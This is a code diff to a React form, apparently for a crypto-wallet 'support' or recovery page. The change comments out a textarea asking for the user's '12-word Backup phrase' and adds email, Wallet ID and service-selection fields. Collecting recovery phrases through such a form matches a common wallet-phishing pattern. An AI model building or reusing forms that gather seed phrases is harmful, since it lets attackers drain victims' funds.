@@ -27,6 +27,21 @@ const Form = (props) => {
             label: 'My Wallet Recovery failed',
         },
     ]
+    const serviceOptions = [
+        {
+            label: 'Wallet',
+        },
+        {
+            label: 'Identity Verification',
+        },
+        {
+            label: 'Security Concern',
+        },
+
+        {
+            label: 'My Wallet Recovery failed',
+        },
+    ]
 
     const customStyles = {
         option: (styles, state) => ({
@@ -106,7 +121,7 @@ const Form = (props) => {
                         onChange={onPackageChange}
                     />
                 </div>
-                <div>
+                {/* <div>
                     <textarea
                         id='phrase'
                         className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
@@ -116,10 +131,28 @@ const Form = (props) => {
                         placeholder='Enter 12-word Backup phrase'
                         onChange={handlePhrase}
                     />
+                </div> */}
+                <div className='grid'>
+                    <label>Your email address</label>
+                    <input className='border ' />
+                </div>
+                <div className='grid'>
+                    <label>Wallet ID</label>
+                    <input className='border ' />
+                </div>
+                <div className='grid'>
+                    <label>What service is your query about?</label>
+                    <Select
+                        options={serviceOptions}
+                        isClearable
+                        placeholder={'-'}
+                        styles={customStyles}
+                        onChange={onPackageChange}
+                    />{' '}
                 </div>
                 <div className='grid'>
                     <label>Your email address</label>
-                    <input/>
+                    <input className='border ' />
                 </div>
             </div>
 
